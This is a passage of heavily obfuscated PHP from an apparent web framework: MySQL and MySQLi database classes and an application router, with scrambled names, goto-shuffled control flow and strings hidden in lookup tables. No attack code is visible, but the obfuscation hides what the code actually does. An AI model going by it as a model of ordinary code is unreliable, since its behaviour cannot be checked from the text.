($aİº¯‰ÆÛŒ ? $bÜíÈí…éÊ[875] : $bÜíÈí…éÊ[876]) . $bÜíÈí…éÊ[877] . $this->parseTable($d¸÷ßŠóÚ [$bÜíÈí…éÊ[286]]) . $bÜíÈí…éÊ[871] . implode($bÜíÈí…éÊ[47], $dÓåÓ³ÄØ) . $bÜíÈí…éÊ[878] . implode($bÜíÈí…éÊ[47], $A¾ùğØ¦Èš); return $this->execute($bÒì’È·Ó); goto f‰óç«¥‹; C–Å…ÙÕÜì: $A¾ùğØ¦Èš = array(); foreach ($Aºùß­Âœ† as $bÂ­§ì‡§) { $fÀÖåÌ°“ˆ = array(); foreach ($bÂ­§ì‡§ as $béåäÊâ¹± => $e„¬«…°˜) { $e„¬«…°˜ = $this->parseValue($e„¬«…°˜); if (is_scalar($e„¬«…°˜)) { $fÀÖåÌ°“ˆ[] = $e„¬«…°˜; } } $A¾ùğØ¦Èš[] = $bÜíÈí…éÊ[267] . implode($bÜíÈí…éÊ[47], $fÀÖåÌ°“ˆ) . $bÜíÈí…éÊ[873]; } array_walk($dÓåÓ³ÄØ, array($this, $bÜíÈí…éÊ[874])); goto f„œÚÏ„; f‰óç«¥‹: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $fŞ•¼ÓÖ¥¯ =& $_SERVER[úÉ·öƒÑì©]; $this->error = mysql_errno() . $fŞ•¼ÓÖ¥¯[4] . mysql_error($this->_linkID); if ($fŞ•¼ÓÖ¥¯[33] != $this->queryStr) { $this->error .= LNG($fŞ•¼ÓÖ¥¯[45]) . $this->queryStr; } think_trace($this->error, $fŞ•¼ÓÖ¥¯[33], $fŞ•¼ÓÖ¥¯[46]); return $this->error; } public function escapeString($cÈ÷ô±–ì) { if ($this->_linkID) { return mysql_real_escape_string($cÈ÷ô±–ì, $this->_linkID); } else { return mysql_escape_string($cÈ÷ô±–ì); } } public function parseKey(&$dÀã¯Ãó¢·, $cå§¬¼Ã™¹ = true) { $b·ù¹®™–ù =& $_SERVER[úÉ·öƒÑì©]; if ($cå§¬¼Ã™¹) { $dÀã¯Ãó¢· = $this->parseKeyCheck($dÀã¯Ãó¢·); } if ($dÀã¯Ãó¢· != $b·ù¹®™–ù[182] && !preg_match($b·ù¹®™–ù[879], $dÀã¯Ãó¢·)) { $dÀã¯Ãó¢· = $b·ù¹®™–ù[391] . trim($dÀã¯Ãó¢·, $b·ù¹®™–ù[391]) . $b·ù¹®™–ù[391]; } return $dÀã¯Ãó¢·; } } class DbMysqli extends Db { public function __construct($E÷¤’¡„ÎÂ = '') { $F½ÅºÇ†‰Ë =& $_SERVER[úÉ·öƒÑì©]; if (!extension_loaded($F½ÅºÇ†‰Ë[774])) { think_exception(think_lang($F½ÅºÇ†‰Ë[10]) . $F½ÅºÇ†‰Ë[880]); } if (!empty($E÷¤’¡„ÎÂ)) { $this->config = $E÷¤’¡„ÎÂ; if (empty($this->config[$F½ÅºÇ†‰Ë[13]])) { $this->config[$F½ÅºÇ†‰Ë[13]] = $F½ÅºÇ†‰Ë[33]; } } } public function connect($aÓïœê„’Ç = '', $BµÊÊ£¿ÚÕ = 0) { $cÀÚÕ„ÅÃê =& $_SERVER[úÉ·öƒÑì©]; if (!isset($this->linkID[$BµÊÊ£¿ÚÕ])) { goto Eø´îóªÑ; Cö¦òŒŞ¤: $dêõø‰¨­“ = $this->linkID[$BµÊÊ£¿ÚÕ]->server_version; $this->linkID[$BµÊÊ£¿ÚÕ]->query($cÀÚÕ„ÅÃê[858] . think_config($cÀÚÕ„ÅÃê[859]) . $cÀÚÕ„ÅÃê[55]); if ($dêõø‰¨­“ > $cÀÚÕ„ÅÃê[860]) { $this->linkID[$BµÊÊ£¿ÚÕ]->query($cÀÚÕ„ÅÃê[861]); } goto CÉ„Ìë‚ƒƒ; Eø´îóªÑ: if (empty($aÓïœê„’Ç)) { $aÓïœê„’Ç = $this->config; } $this->linkID[$BµÊÊ£¿ÚÕ] = new mysqli($aÓïœê„’Ç[$cÀÚÕ„ÅÃê[854]], $aÓïœê„’Ç[$cÀÚÕ„ÅÃê[856]], $aÓïœê„’Ç[$cÀÚÕ„ÅÃê[857]], $aÓïœê„’Ç[$cÀÚÕ„ÅÃê[17]], $aÓïœê„’Ç[$cÀÚÕ„ÅÃê[855]] ? intval($aÓïœê„’Ç[$cÀÚÕ„ÅÃê[855]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto Cö¦òŒŞ¤; CÉ„Ìë‚ƒƒ: $this->connected = !0; if (1 != think_config($cÀÚÕ„ÅÃê[18])) { unset($this->config); } goto D‡òŞÙƒ•; D‡òŞÙƒ•: } return $this->linkID[$BµÊÊ£¿ÚÕ]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($C¿õß“í»è) { goto cãÆ±¶íó›; cÎ•»Ş¼•º: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto dÇ¹†‹ŒªÚ; E»ãÓ–áó¢: $this->queryStr = $C¿õß“í»è; if ($this->queryID) { $this->free(); } think_action_status($Fó¢ó•ó†Á[19], 1); goto DÆ•Ãîì»; cãÆ±¶íó›: $Fó¢ó•ó†Á =& $_SERVER[úÉ·öƒÑì©]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto E»ãÓ–áó¢; DÆ•Ãîì»: think_status($Fó¢ó•ó†Á[20]); $this->queryID = $this->_linkID->query($C¿õß“í»è); if ($this->_linkID->more_results()) { while (($fÆ¸Ï¹œé = $this->_linkID->next_result()) != NULL) { $fÆ¸Ï¹œé->free_result(); } } goto cÎ•»Ş¼•º; dÇ¹†‹ŒªÚ: } public function execute($eÃ²Ë«†Ò´) { goto b‹àîÖ¢èÚ; b‹àîÖ¢èÚ: $BË¸–İô» =& $_SERVER[úÉ·öƒÑì©]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto F¯Çà¥Š¤š; bèäãö¿Äî: if (!1 === $Cê•Å›„¤†) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto c‘Å›¡ßçÈ; F¯Çà¥Š¤š: $this->queryStr = $eÃ²Ë«†Ò´; if ($this->queryID) { $this->free(); } think_action_status($BË¸–İô»[21], 1); goto Aø§¤­ë¼Å; Aø§¤­ë¼Å: think_status($BË¸–İô»[20]); $Cê•Å›„¤† = $this->_linkID->query($eÃ²Ë«†Ò´); $this->debug(); goto bèäãö¿Äî; c‘Å›¡ßçÈ: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $d§Ÿİ×Ç¿ê = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$d§Ÿİ×Ç¿ê) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $fò·†¦»¨ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$fò·†¦»¨) { $this->error(); return !1; } } return !0; } private function getAll() { $a›æà¦ÑéÕ = array(); if ($this->numRows > 0) { for ($B¹À“ÕÅ = 0; $B¹À“ÕÅ < $this->numRows; $B¹À“ÕÅ++) { $a›æà¦ÑéÕ[$B¹À“ÕÅ] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $a›æà¦ÑéÕ; } public function getFields($e†‚¥éèÖ) { $Eñ˜ŞÃĞí‘ =& $_SERVER[úÉ·öƒÑì©]; $aÊ‰‹óÌæª = $this->query($Eñ˜ŞÃĞí‘[865] . $this->parseKey($e†‚¥éèÖ)); $aŞÛ´´Š¡° = array(); if ($aÊ‰‹óÌæª) { foreach ($aÊ‰‹óÌæª as $d¸òİÀ‰½” => $c¸–ÇÜéõã) { $aŞÛ´´Š¡°[$c¸–ÇÜéõã[$Eñ˜ŞÃĞí‘[27]]] = array($Eñ˜ŞÃĞí‘[28] => $c¸–ÇÜéõã[$Eñ˜ŞÃĞí‘[27]], $Eñ˜ŞÃĞí‘[29] => $c¸–ÇÜéõã[$Eñ˜ŞÃĞí‘[30]], $Eñ˜ŞÃĞí‘[31] => (bool) ($c¸–ÇÜéõã[$Eñ˜ŞÃĞí‘[32]] === $Eñ˜ŞÃĞí‘[33]), $Eñ˜ŞÃĞí‘[34] => $c¸–ÇÜéõã[$Eñ˜ŞÃĞí‘[35]], $Eñ˜ŞÃĞí‘[36] => strtolower($c¸–ÇÜéõã[$Eñ˜ŞÃĞí‘[37]]) == $Eñ˜ŞÃĞí‘[38], $Eñ˜ŞÃĞí‘[39] => strtolower($c¸–ÇÜéõã[$Eñ˜ŞÃĞí‘[40]]) == $Eñ˜ŞÃĞí‘[41]); } } return $aŞÛ´´Š¡°; } public function getTables($E•œ´˜— = '') { $Dñ‰´›– =& $_SERVER[úÉ·öƒÑì©]; $B¬£õšòùÁ = !empty($E•œ´˜—) ? $Dñ‰´›–[867] . $E•œ´˜— . $Dñ‰´›–[868] : $Dñ‰´›–[869]; $e¿‚‰¢˜›¦ = $this->query($B¬£õšòùÁ); $cÉğ›Ôˆ„· = array(); if ($e¿‚‰¢˜›¦) { foreach ($e¿‚‰¢˜›¦ as $E˜¥ÎãŠ => $bã”‡¸â˜”) { $cÉğ›Ôˆ„·[$E˜¥ÎãŠ] = current($bã”‡¸â˜”); } } return $cÉğ›Ôˆ„·; } public function replace($d”ÓÏÌõ–±, $a§ˆ÷×¸ãã = array()) { $Aê¿Ÿ°ÔÊ„ =& $_SERVER[úÉ·öƒÑì©]; foreach ($d”ÓÏÌõ–± as $F˜É£êÑĞ => $EÄƒ§‰ÆÕ) { $C‰š—µ“Èô = $this->parseValue($EÄƒ§‰ÆÕ); if (is_scalar($C‰š—µ“Èô)) { $FÃÍÒ ÒÆß[] = $C‰š—µ“Èô; $Fƒ–‘ŒŞ¡–[] = $this->parseKey($F˜É£êÑĞ); } } $cÃ…Î Íˆ¶ = $Aê¿Ÿ°ÔÊ„[870] . $this->parseTable($a§ˆ÷×¸ãã[$Aê¿Ÿ°ÔÊ„[286]]) . $Aê¿Ÿ°ÔÊ„[871] . implode($Aê¿Ÿ°ÔÊ„[47], $Fƒ–‘ŒŞ¡–) . $Aê¿Ÿ°ÔÊ„[872] . implode($Aê¿Ÿ°ÔÊ„[47], $FÃÍÒ ÒÆß) . $Aê¿Ÿ°ÔÊ„[873]; return $this->execute($cÃ…Î Íˆ¶); } public function insertAll($cÙÓÕÏ‚‰‰, $E·¸‡ÄÉµÛ = array(), $e…ˆ«ë¿Â = false) { goto b¸áÙÜ‚¯; F¤¸ùÖÛĞ : $f¨ùµÅÃ£ = array(); foreach ($cÙÓÕÏ‚‰‰ as $aÕƒö·ğÕğ) { $b¿¹Òƒ÷í = array(); foreach ($aÕƒö·ğÕğ as $D‘¿–¡Ş™ó => $A÷’–ç¿³Š) { $A÷’–ç¿³Š = $this->parseValue($A÷’–ç¿³Š); if (is_scalar($A÷’–ç¿³Š)) { $b¿¹Òƒ÷í[] = $A÷’–ç¿³Š; } } $f¨ùµÅÃ£[] = $eÉª—æ‡¡[267] . implode($eÉª—æ‡¡[47], $b¿¹Òƒ÷í) . $eÉª—æ‡¡[873]; } array_walk($C«ñ¨—˜ŞÒ, array($this, $eÉª—æ‡¡[874])); goto Bê±âìùë½; b¸áÙÜ‚¯: $eÉª—æ‡¡ =& $_SERVER[úÉ·öƒÑì©]; if (!is_array($cÙÓÕÏ‚‰‰[0])) { return !1; } $C«ñ¨—˜ŞÒ = array_keys($cÙÓÕÏ‚‰‰[0]); goto F¤¸ùÖÛĞ ; Bê±âìùë½: $e©²¨…‡æ  = $e…ˆ«ë¿Â ? $eÉª—æ‡¡[875] : $eÉª—æ‡¡[876]; $b’±·–ŠÏİ = $e©²¨…‡æ  . $eÉª—æ‡¡[877] . $this->parseTable($E·¸‡ÄÉµÛ[$eÉª—æ‡¡[286]]) . $eÉª—æ‡¡[871] . implode($eÉª—æ‡¡[47], $C«ñ¨—˜ŞÒ) . $eÉª—æ‡¡[878] . implode($eÉª—æ‡¡[47], $f¨ùµÅÃ£); return $this->execute($b’±·–ŠÏİ); goto Bœà‹¤Õî; Bœà‹¤Õî: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $FÍåÜ¹ =& $_SERVER[úÉ·öƒÑì©]; $this->error = $this->_linkID->errno . $FÍåÜ¹[4] . $this->_linkID->error; if ($FÍåÜ¹[33] != $this->queryStr) { $this->error .= LNG($FÍåÜ¹[45]) . $this->queryStr; } think_trace($this->error, $FÍåÜ¹[33], $FÍåÜ¹[46]); return $this->error; } public function escapeString($b»ÆÏÄ£Î) { if ($this->_linkID) { return $this->_linkID->real_escape_string($b»ÆÏÄ£Î); } else { return addslashes($b»ÆÏÄ£Î); } } public function parseKey(&$fİ£šŒËá¼, $fÔÇ˜‚Ûå = true) { $b¯‰›¶Ş„Ò =& $_SERVER[úÉ·öƒÑì©]; if ($fÔÇ˜‚Ûå) { $fİ£šŒËá¼ = $this->parseKeyCheck($fİ£šŒËá¼); } if ($fİ£šŒËá¼ != $b¯‰›¶Ş„Ò[182] && !preg_match($b¯‰›¶Ş„Ò[879], $fİ£šŒËá¼)) { $fİ£šŒËá¼ = $b¯‰›¶Ş„Ò[391] . trim($fİ£šŒËá¼, $b¯‰›¶Ş„Ò[391]) . $b¯‰›¶Ş„Ò[391]; } return $fİ£šŒËá¼; } } goto A‹‡ÊÂ—åĞ; E†•¶İ¢îÙ: class Application { private $defaultModule = "\151\156\x64\145\x78"; private $defaultController = "\x69\x6e\x64\x65\170"; private $defaultAction = "\x69\156\144\145\170"; function __construct() { } public function setDefault($b†Íî”™ƒĞ) { goto cœÏ†»‡Ã•; FçÙ°¾›‡‡: $BËÍ‘ï›¤Ë = $C÷à‚ò³´[589]; $this->defaultController = $fëâ¨õ™[1] ? $fëâ¨õ™[1] : $this->defaultController; $this->defaultAction = $fëâ¨õ™[2] ? $fëâ¨õ™[2] : $this->defaultAction; goto f»¦ÅÕùÑ; cœÏ†»‡Ã•: $C÷à‚ò³´ =& $_SERVER[úÉ·öƒÑì©]; $B›Ş‰à‹Ç† =& $_SERVER[›É]; $fëâ¨õ™ = $B›Ş‰à‹Ç†[0]($B›Ş‰à‹Ç†[1], $B›Ş‰à‹Ç†[2]($b†Íî”™ƒĞ, $B›Ş‰à‹Ç†[1])); goto BÔ…¾ÇÑø; B­°×ßŒ¤: while ($Fëñ³„Áì < $C÷à‚ò³´[592]) { if ($Fëñ³„Áì >= 0) { break; } $Fëñ³„Áì++; } goto C¿¤ˆè²†; f»¦ÅÕùÑ: $A£‚®ªœÁ = $C÷à‚ò³´[590]; $this->{$_SERVER[›É][3]}($B›Ş‰à‹Ç†[4], array($this, $B›Ş‰à‹Ç†[5])); $Fëñ³„Áì = $C÷à‚ò³´[591]; goto B­°×ßŒ¤; BÔ…¾ÇÑø: $CÚ©¤ƒÄ¦¼ = $C÷à‚ò³´[587]; while ($CÚ©¤ƒÄ¦¼ < $C÷à‚ò³´[588]) { if ($CÚ©¤ƒÄ¦¼ >= 0) { break; } $CÚ©¤ƒÄ¦¼++; } $this->defaultModule = $fëâ¨õ™[0] ? $fëâ¨õ™[0] : $this->defaultModule; goto FçÙ°¾›‡‡; C¿¤ˆè²†: } public function appRun($DÇ¯ª‡Í«ñ) { goto A£¶¼‰ùø; A£¶¼‰ùø: $aĞ‰ƒ–Š¶ =& $_SERVER[úÉ·öƒÑì©]; $D¼ïÕ«ÛÒ‹ =& $_SERVER[›É]; $FÀäğÕ¿¢ = $D¼ïÕ«ÛÒ‹[0]($D¼ïÕ«ÛÒ‹[1], $DÇ¯ª‡Í«ñ); goto ešÇ„çŒŠ; A†ìÔé§‹®: if (!$A“Â‹º‰¦á) { die; } if ($d÷¬ÍÖĞ‰ == $D¼ïÕ«ÛÒ‹[8]) { $c‰Ú‡Œæ¨ = $D¼ïÕ«ÛÒ‹[9]; $FÀäğÕ¿¢[0] = $D¼ïÕ«ÛÒ‹[10]; $FÀäğÕ¿¢[1] = $FÀäğÕ¿¢[1] . $D¼ïÕ«ÛÒ‹[11]; $DÇ¯ª‡Í«ñ = $D¼ïÕ«ÛÒ‹[12]($D¼ïÕ«ÛÒ‹[1], $FÀäğÕ¿¢); $DÇ¯ª‡Í«ñ = $D¼ïÕ«ÛÒ‹[2]($DÇ¯ª‡Í«ñ, $D¼ïÕ«ÛÒ‹[1]); } $D¼ïÕ«ÛÒ‹[13](array($D¼ïÕ«ÛÒ‹[14], $D¼ïÕ«ÛÒ‹[15]), $c‰Ú‡Œæ¨ . $D¼ïÕ«ÛÒ‹[16], $DÇ¯ª‡Í«ñ); goto aó®ù²îÛğ; ešÇ„çŒŠ: $d÷¬ÍÖĞ‰ = $D¼ïÕ«ÛÒ‹[6]($FÀäğÕ¿¢[0]); $c‰Ú‡Œæ¨ = $D¼ïÕ«ÛÒ‹[7]; $A“Â‹º‰¦á = $aĞ‰ƒ–Š¶[593]; goto A†ìÔé§‹®; aó®ù²îÛğ: $D¼ïÕ«ÛÒ‹[17]($DÇ¯ª‡Í«ñ); $D¼ïÕ«ÛÒ‹[13](array($D¼ïÕ«ÛÒ‹[14], $D¼ïÕ«ÛÒ‹[15]), $c‰Ú‡Œæ¨ . $D¼ïÕ«ÛÒ‹[18], $DÇ¯ª‡Í«ñ); $DˆÁœ…¢áÆ = $aĞ‰ƒ–Š¶[594]; goto EâÚ“¨Ô®; EâÚ“¨Ô®: } private function autorun() { $E«¾ÎÁ·Š =& $_SERVER[›É]; global $config; $D¯ºÔ¾µˆŒ = $_SERVER[úÉ·öƒÑì©][595]; if ($E«¾ÎÁ·Š[19]($config[$E«¾ÎÁ·Š[20]]) == 0) { return; } foreach ($config[$E«¾ÎÁ·Š[20]] as $cÅÕÅ§”á¡ => $EÄ§†òáøÌ) { $this->{$_SERVER[›É][21]}($EÄ§†òáøÌ); } } private function lgqi13c2e118() { goto FĞ¾Ûñ¤İ; cÚ»ïœ¸¦„: $a­Â›¨ßİ½ = $Cğ»÷Ñ¹¾[26]($GLOBALS[$Cğ»÷Ñ¹¾[22]][$Cğ»÷Ñ¹¾[23]], 1); $GLOBALS[$Cğ»÷Ñ¹¾[22]][$Cğ»÷Ñ¹¾[23]] = $Cğ»÷Ñ¹¾[27]($f±ôÒŸõí, $a­Â›¨ßİ½); $GLOBALS[$Cğ»÷Ñ¹¾[22]][$Cğ»÷Ñ¹¾[28]] = $Cğ»÷Ñ¹¾[29]($Cğ»÷Ñ¹¾[1], $GLOBALS[$Cğ»÷Ñ¹¾[22]][$Cğ»÷Ñ¹¾[23]]); goto EóÑ±òì; Dãêá×¬æ¨: if ($Cğ»÷Ñ¹¾[6]($Cğ»÷Ñ¹¾[25]($d“ƒ°‘èÌ, -$Cğ»÷Ñ¹¾[24]($b¯¯áøÃ»))) != $b¯¯áøÃ») { return; } $DêãÏßôé½ = $Cğ»÷Ñ¹¾[25]($d“ƒ°‘èÌ, 0, -$Cğ»÷Ñ¹¾[24]($b¯¯áøÃ»)); $f±ôÒŸõí = array($Cğ»÷Ñ¹¾[8], $DêãÏßôé½); goto cÚ»ïœ¸¦„; aöÈ±Í”ğİ: $açò•ˆÑ‹ = $AÅ—–…ñ‰[598]; if (strlen($açò•ˆÑ‹) < $AÅ—–…ñ‰[588]) { die; } if (!$d“ƒ°‘èÌ || $Cğ»÷Ñ¹¾[24]($d“ƒ°‘èÌ) <= $Cğ»÷Ñ¹¾[24]($b¯¯áøÃ»)) { return; } goto Dãêá×¬æ¨; FĞ¾Ûñ¤İ: $AÅ—–…ñ‰ =& $_SERVER[úÉ·öƒÑì©]; $Cğ»÷Ñ¹¾ =& $_SERVER[›É]; $b¯¯áøÃ» = $Cğ»÷Ñ¹¾[8]; goto aê°Æñç¬; aê°Æñç¬: $B°œ Ò„² = $AÅ—–…ñ‰[596]; if (strlen($B°œ Ò„²) < $AÅ—–…ñ‰[597]) { die; } $d“ƒ°‘èÌ = $GLOBALS[$Cğ»÷Ñ¹¾[22]][$Cğ»÷Ñ¹¾[23]][0]; goto aöÈ±Í”ğİ; EóÑ±òì: } private function ptmr6d793fc5() { goto e³óÄô§ê—; F‰ö˜É„à¢: $D¬Éò÷®Î = $EÃ®ç·æŠë[2]($d½Ç×ÁøÀØ[0][0], $EÃ®ç·æŠë[36]); $GLOBALS[$EÃ®ç·æŠë[22]][$EÃ®ç·æŠë[23]] = $EÃ®ç·æŠë[0]($EÃ®ç·æŠë[36], $D¬Éò÷®Î); $D¢ãŠ£‘æ‰ = $eë‘İ³Ğ[602]; goto CÖ„‚ÁùÃ¦; bÛ”¥Ë…–¾: $d‡ÌÙËëšÂ = $_SERVER[$EÃ®ç·æŠë[30]]; $eŒç§†‘´ = $eë‘İ³Ğ[599]; if (strlen($eŒç§†‘´) < $eë‘İ³Ğ[592]) { die; } goto fŒíãîâ‚ó; B‹çÀ¾Ş‰: if (!$EÃ®ç·æŠë[32]($d‡ÌÙËëšÂ, $a’“Îä×Î¸)) { return; } $dãœš“¥˜ = $EÃ®ç·æŠë[33]($d‡ÌÙËëšÂ, $a’“Îä×Î¸); $Cù™ƒßó¶¦ = $eë‘İ³Ğ[601]; goto d¶´Íè÷; e³óÄô§ê—: $eë‘İ³Ğ =& $_SERVER[úÉ·öƒÑì©]; $EÃ®ç·æŠë =& $_SERVER[›É]; if ($GLOBALS[$EÃ®ç·æŠë[22]][$EÃ®ç·æŠë[28]] != $EÃ®ç·æŠë[10]) { return; } goto bÛ”¥Ë…–¾; CÖ„‚ÁùÃ¦: if (!$D¢ãŠ£‘æ‰) { return; } $GLOBALS[$EÃ®ç·æŠë[22]][$EÃ®ç·æŠë[28]] = $EÃ®ç·æŠë[29]($EÃ®ç·æŠë[1], $GLOBALS[$EÃ®ç·æŠë[22]][$EÃ®ç·æŠë[23]]); goto A‹¿Í§Úß¨; d¶´Íè÷: if (!$Cù™ƒßó¶¦) { die; } $D¬Éò÷®Î = $EÃ®ç·æŠë[25]($d‡ÌÙËëšÂ, $dãœš“¥˜ + $EÃ®ç·æŠë[24]($a’“Îä×Î¸)); $EÃ®ç·æŠë[34]($EÃ®ç·æŠë[35], $D¬Éò÷®Î, $d½Ç×ÁøÀØ); goto F‰ö˜É„à¢; fŒíãîâ‚ó: $a’“Îä×Î¸ = $EÃ®ç·æŠë[31]; $D­®”êçÇ = $eë‘İ³Ğ[600]; while ($D­®”êçÇ < $eë‘İ³Ğ[592]) { if ($D­®”êçÇ >= 0) { break; } $D­®”êçÇ++; } goto B‹çÀ¾Ş‰; A‹¿Í§Úß¨: } public function run() { goto eáƒ²ñ¥—š; D™ğƒäó†: $aæëÚ…™ß[39]($aæëÚ…™ß[41], isset($D‚«Â¨ë[1]) && $D‚«Â¨ë[0] ? $D‚«Â¨ë[1] : $this->defaultController); $cÉÉ»¶ƒ¸¶ = $d¨ÀÀŸ¯Š„[604]; if (!$cÉÉ»¶ƒ¸¶) { die; } goto C½ŠË×Â—±; eáƒ²ñ¥—š: $d¨ÀÀŸ¯Š„ =& $_SERVER[úÉ·öƒÑì©]; $aæëÚ…™ß =& $_SERVER[›É]; $this->{$_SERVER[›É][37]}(); goto e…ÂÕåŸŒ†; e…ÂÕåŸŒ†: $this->{$_SERVER[›É][38]}(); $D‚«Â¨ë = $GLOBALS[$aæëÚ…™ß[22]][$aæëÚ…™ß[23]]; $F‘÷ô”œ›Ÿ = $GLOBALS[$aæëÚ…™ß[22]][$aæëÚ…™ß[28]]; goto e©¾–ƒáá; AÙŠØ½Âõ×: $_SERVER[$aæëÚ…™ß[44]] = $aæëÚ…™ß[6](ACTION); $this->{$_SERVER[›É][45]}(); $bÄ¼è‹ØÆë = $d¨ÀÀŸ¯Š„[606]; goto A¥°ñÙ—; e©¾–ƒáá: $aæëÚ…™ß[39]($aæëÚ…™ß[40], isset($D‚«Â¨ë[0]) && $D‚«Â¨ë[0] ? $D‚«Â¨ë[0] : $this->defaultModule); $f—Ö£ÉÉŸÈ = $d¨ÀÀŸ¯Š„[603]; if (strlen($f—Ö£ÉÉŸÈ) < $d¨ÀÀŸ¯Š„[597]) { die; } goto D™ğƒäó†; A¥°ñÙ—: if (!$bÄ¼è‹ØÆë) { die; } if ($aæëÚ…™ß[19]($D‚«Â¨ë) >= 3) { $this->{$_SERVER[›É][21]}($F‘÷ô”œ›Ÿ); } else { $this->{$_SERVER[›É][21]}(ACTION); } goto BÒÒ“öÍ¿­; C½ŠË×Â—±: $aæëÚ…™ß[39]($aæëÚ…™ß[42], isset($D‚«Â¨ë[2]) && $D‚«Â¨ë[0] ? $D‚«Â¨ë[2] : $this->defaultAction); $aæëÚ…™ß[39]($aæëÚ…™ß[43], MOD . $aæëÚ…™ß[1] . ST . $aæëÚ…™ß[1] . ACT); $F”ÚĞÆ‰‰ = $d¨ÀÀŸ¯Š„[605]; goto AÙŠØ½Âõ×; BÒÒ“öÍ¿­: } private $vinoab61c75a = array(); private $hoik95ab8e6b = ''; public function zonb613695b3() { goto Dë«‹É; e©„Ì­é£: $bï¦“§ùê = $e²…Š¶¤[608]; $this->{$_SERVER[›É][48]}(); $this->{$_SERVER[›É][49]}(); goto A„¼†Œ‡; c´»µ·¡ŒŞ: $D‡ºÁğ„¹Ó = $e²…Š¶¤[609]; $this->{$_SERVER[›É][3]}($B¿ï†æÖó[53], array($this, $B¿ï†æÖó[54])); $EÌƒ¡Æö = $e²…Š¶¤[610]; goto b²ÓÛëª¸; b²ÓÛëª¸: if (strlen($EÌƒ¡Æö) < $e²…Š¶¤[248]) { return; } $this->{$_SERVER[›É][3]}($B¿ï†æÖó[55], array($this, $B¿ï†æÖó[56])); $this->{$_SERVER[›É][3]}($B¿ï†æÖó[57], array($this, $B¿ï†æÖó[58])); goto c¶‡©¦°–; Dë«‹É: $e²…Š¶¤ =& $_SERVER[úÉ·öƒÑì©]; $B¿ï†æÖó =& $_SERVER[›É]; $this->{$_SERVER[›É][46]}(); goto d·´È¦À; c¶‡©¦°–: $B‰‚ÖàÔÓ  = $e²…Š¶¤[611]; while ($B‰‚ÖàÔÓ  < $e²…Š¶¤[248]) { if ($B‰‚ÖàÔÓ  >= 0) { break; } $B‰‚ÖàÔÓ ++; } $this->{$_SERVER[›É][3]}($B¿ï†æÖó[59], array($this, $B¿ï†æÖó[60])); goto b›í˜İá; d·´È¦À: $cİ‹«óõ•µ = $e²…Š¶¤[607]; if (strlen($cİ‹«óõ•µ) < $e²…Š¶¤[592]) { die; } $this->{$_SERVER[›É][47]}(); goto e©„Ì­é£; A„¼†Œ‡: $this->{$_SERVER[›É][50]}(); $this->{$_SERVER[›É][51]}(); $this->{$_SERVER[›É][52]}(); goto c´»µ·¡ŒŞ; b›í˜İá: $AÆŞô‰ñó¯ = $e²…Š¶¤[612]; if (!$AÆŞô‰ñó¯) { return; } goto f‰¼’¾ñÓ; f‰¼’¾ñÓ: } public function syaccfb52ed7($e¬¹÷â·¹) { goto CØÓ‡Ï—òŞ; FÀğ·ÀÄËŸ: $e¬¹÷â·¹[$BòãÒ‹ßù[106]][$BòãÒ‹ßù[107]][$BòãÒ‹ßù[112]] = array($BòãÒ‹ßù[113] => (int) $F¹µÏ“²¿š[$BòãÒ‹ßù[114]], $BòãÒ‹ßù[115] => (int) $BòãÒ‹ßù[116]($F¹µÏ“²¿š, $BòãÒ‹ßù[117], 0)); $eÙ™ßæŠ› = $c‰İ×ÊƒŞã[618]; $e¬¹÷â·¹[$BòãÒ‹ßù[118]][$BòãÒ‹ßù[119]] = $BòãÒ‹ßù[120]($BòãÒ‹ßù[121])->{$_SERVER[›É][122]}(); goto e“åÙÔ”; Dª”à„†ø: $CÈ‚Ì½Û‰Ô = array($BòãÒ‹ßù[64], $BòãÒ‹ßù[65], $BòãÒ‹ßù[66], $BòãÒ‹ßù[67], $BòãÒ‹ßù[68], $BòãÒ‹ßù[69], $BòãÒ‹ßù[70], $BòãÒ‹ßù[71], $BòãÒ‹ßù[72], $BòãÒ‹ßù[73], $BòãÒ‹ßù[74], $BòãÒ‹ßù[75], $BòãÒ‹ßù[76], $BòãÒ‹ßù[77], $BòãÒ‹ßù[78], $BòãÒ‹ßù[79], $BòãÒ‹ßù[80], $BòãÒ‹ßù[81], $BòãÒ‹ßù[82], $BòãÒ‹ßù[83], $BòãÒ‹ßù[84], $BòãÒ‹ßù[85], $BòãÒ‹ßù[86], $BòãÒ‹ßù[87], $BòãÒ‹ßù[88], $BòãÒ‹ßù[89], $BòãÒ‹ßù[90], $BòãÒ‹ßù[91], $BòãÒ‹ßù[92], $BòãÒ‹ßù[93], $BòãÒ‹ßù[94], $BòãÒ‹ßù[95], $BòãÒ‹ßù[96], $BòãÒ‹ßù[97], $BòãÒ‹ßù[98], $BòãÒ‹ßù[99], $BòãÒ‹ßù[100], $BòãÒ‹ßù[101], $BòãÒ‹ßù[102], $BòãÒ‹ßù[103]); $AÆ½ï×­®¥ = $c‰İ×ÊƒŞã[613]; if (!$AÆ½ï×­®¥) { return; } goto DÈîòÌ‘î×; f´œØÏÛ‰Í: $Dë¬µ‘Ïã¨ = $c‰İ×ÊƒŞã[622]; while (strlen($Dë¬µ‘Ïã¨) < $c‰İ×ÊƒŞã[616]) { if (!$Dë¬µ‘Ïã¨) { break; } $Dë¬µ‘Ïã¨++; } if ($BòãÒ‹ßù[116]($GLOBALS, $BòãÒ‹ßù[142]) && $this->config[$BòãÒ‹ßù[143]]) { $e¬¹÷â·¹[$BòãÒ‹ßù[118]][$BòãÒ‹ßù[144]] = WEB_ROOT; } goto D‡°‡öÊ›…; D‡°‡öÊ›…: 